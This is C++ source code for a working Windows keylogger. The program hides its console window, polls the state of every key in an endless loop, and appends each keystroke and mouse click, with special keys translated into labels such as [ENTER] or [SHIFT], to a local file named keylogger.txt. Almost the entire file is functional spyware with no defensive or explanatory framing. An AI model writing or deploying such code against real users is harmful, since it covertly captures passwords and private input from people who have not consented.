#include <iostream>
#include <fstream>
#include <Windows.h>

using namespace std;

//Path of log
#define LOG_PATH "keylogger.txt"//<--- The Keylogger filePath goes here

//Save data
void saveData(string data) {
	ofstream log(LOG_PATH, ios::app);
	log << data;
	log.close();
}

//Translate special key
string translateKey(int key) {
	switch (key)
	{
	case VK_LBUTTON:
		//Left mouse button
		return "[LBUTTON] ";
	case VK_RBUTTON:
		//Right mouse button
		return "[RBUTTON] ";
	case VK_MBUTTON:
		//Middle mouse button
		return "[MBUTTON] ";
	case VK_CANCEL:
		//Cancel
		return "[Cancel] ";
	case VK_XBUTTON1:
		//X1 mouse button
		return "[X1Mouse] ";
	case VK_XBUTTON2:
		//X2 mouse button
		return "[X2Mouse] ";
	case VK_CLEAR:
		//Clear
		return "[Clear] ";
	case VK_PAUSE:
		//Pause
		return "[PAUSE] ";
	case VK_PRIOR:
		//Page Up
		return "[PAGEUP] ";
	case VK_NEXT:
		//Page down
		return "[PAGEDOWN] ";
	case VK_END:
		//End
		return "[END] ";
	case VK_HOME:
		//Home
		return "[HOME] ";
	case VK_SELECT:
		// Select
		return "[SELECT] ";
	case VK_PRINT:
		// Print
		return "[PRINT] ";
	case VK_EXECUTE:
		// Execute
		return "[EXE] ";
	case VK_SNAPSHOT:
		// Print Screen
		return "[PRINTSCREEN] ";
	case VK_INSERT:
		// Insert
		return "[INS] ";
	case VK_DELETE:
		// Del
		return "[Delete] ";
	case VK_HELP:
		//Help
		return "[HELP] ";
	case VK_NUMPAD0:
		// Numoad
		return "[NUMPAD0] ";
	case VK_NUMPAD1:
		// Numoad1
		return "[NUMPAD1] ";
	case VK_NUMPAD2:
		// Numoad2
		return "[NUMPAD2] ";
	case VK_NUMPAD3:
		// Numoad3
		return "[NUMPAD3] ";
	case VK_NUMPAD4:
		// Numoad4
		return "[NUMPAD4] ";
	case VK_NUMPAD5:
		// Numoad5
		return "[NUMPAD5] ";
	case VK_NUMPAD6:
		// Numoad6
		return "[NUMPAD6] ";
	case VK_NUMPAD7:
		// Numoad7
		return "[NUMPAD7] ";
	case VK_NUMPAD8:
		// Numoad8
		return "[NUMPAD8] ";
	case VK_NUMPAD9:
		// Numoad9
		return "[NUMPAD9] ";
	case VK_MULTIPLY :
		// Numpad Multiply
		return "[*] ";
	case VK_ADD:
		// Numpad Add
		return "[+] ";
	case VK_SEPARATOR:
		// Numpad Separator
		return "[SEPARATOR] ";
	case VK_DECIMAL:
		// Numpad Deciimal
		return "[.] ";
	case VK_SUBTRACT:
		// numpad Subtract
		return "[-] ";
	case VK_DIVIDE:
		// numpad divide
		return "[/] ";
	case VK_SPACE:
		//Space
		return "[SPACE] ";
	case VK_CAPITAL:
		//Capslock
		return "[CAPSLOCK] ";
	case VK_ESCAPE:
		//Escape
		return "[ESC] ";
	case VK_TAB:
		//Tab
		return "[TAB] ";
	case VK_SHIFT:
		//Shift
		return "[SHIFT] ";
	case VK_CONTROL:
		//CONTROL
		return "[CTRL] ";
	case VK_MENU:
		//Menu
		return "[ALT] ";
	case VK_BACK:
		//Back
		return "[BACKSPACE] ";
	case VK_RETURN:
		//ENTER
		return "[ENTER]\n";
	case VK_UP:
		//Up
		return "[UP] ";
	case VK_DOWN:
		//Down
		return "[DOWN] ";
	case VK_RIGHT:
		//Right
		return "[RIGHT] ";
	case VK_LEFT:
		//Left
		return "[LEFT] ";
	case VK_F1:
		//F1
		return "[F1] ";
	case VK_F2:
		//F2
		return "[F2] ";
	case VK_F3:
		//F3
		return "[F3] ";
	case VK_F4:
		//F4
		return "[F4] ";
	case VK_F5:
		//5
		return "[F5] ";
	case VK_F6:
		//F6
		return "[F6] ";
	case VK_F7:
		//F7
		return "[F7] ";
	case VK_F8:
		//F8
		return "[F8] ";
	case VK_F9:
		//F9
		return "[F9] ";
	case VK_F10:
		//F10
		return "[F10] ";
	case VK_F11:
		//F11
		return "[F11] ";
	case VK_F12:
		//F12
		return "[F12] ";
	case VK_F13:
		//F13
		return "[F13] ";
	case VK_F14:
		//F14
		return "[F14] ";
	case VK_F15:
		//F15
		return "[F15] ";
	case VK_F16:
		//F16
		return "[F16] ";
	case VK_F17:
		//F17
		return "[F17] ";
	case VK_F18:
		//F18
		return "[F18] ";
	case VK_F19:
		//F19
		return "[F19] ";
	case VK_F20:
		//F20
		return "[F20] ";
	case VK_F21:
		//F21
		return "[F21] ";
	case VK_F22:
		//F22
		return "[F22] ";
	case VK_F23:
		//F23
		return "[F23] ";
	case VK_F24:
		//F24
		return "[F24] ";
	case VK_NUMLOCK:
		//Numlock	
		return "[NUMLOCK] ";
	case VK_SCROLL:
		//Scrollcok
		return "[SCROLLOCK] ";

	default:
		return "[UNKNOWN KEY]";
	}
}

//Main function
int main() {
	// Start of the program
	saveData("\n\n");

	int specialKeyArray[74] = {VK_LBUTTON,VK_RBUTTON,VK_CANCEL, VK_MBUTTON, VK_XBUTTON1,VK_XBUTTON2,VK_CLEAR,VK_PAUSE,VK_PRIOR,VK_NEXT,VK_END,VK_HOME,VK_SELECT,
								VK_PRINT,VK_EXECUTE,VK_SNAPSHOT,VK_INSERT,VK_DELETE, VK_HELP, VK_NUMPAD0, VK_NUMPAD1, VK_NUMPAD2, VK_NUMPAD3, VK_NUMPAD4, VK_NUMPAD5, VK_NUMPAD6,
								VK_NUMPAD7,VK_NUMPAD8,VK_NUMPAD9,VK_MULTIPLY,VK_ADD,VK_SEPARATOR,VK_DECIMAL,VK_SUBTRACT,VK_DIVIDE,VK_SPACE, VK_CAPITAL, VK_ESCAPE, VK_TAB,VK_SHIFT,
								VK_CONTROL, VK_MENU, VK_BACK, VK_RETURN, VK_UP,VK_DOWN, VK_RIGHT, VK_LEFT,VK_F1, VK_F2, VK_F3, VK_F4, VK_F5, VK_F6, VK_F7, VK_F8, VK_F9, VK_F10, VK_F11, VK_F12,VK_F13,VK_F14,VK_F15,
								VK_F16,VK_F17,VK_F18,VK_F19 ,VK_F20 ,VK_F21 ,VK_F22 ,VK_F23, VK_F24, VK_NUMLOCK, VK_SCROLL};
	// Hide window
	HWND hwnd = GetConsoleWindow();
	ShowWindow(hwnd, SW_HIDE);

	while (true) {
		for (int key = 8; key < 255; key++)
		{
			if (GetAsyncKeyState(key) == -32767) {
				bool isSpecial = find(begin(specialKeyArray), end(specialKeyArray), key) != end(specialKeyArray);
					if (isSpecial)
					{
						saveData(translateKey(key));
					}
					else
					{
						string data = string(1, (char)key);
						saveData(data);
					}
			}
		}
		Sleep(10);
	}
}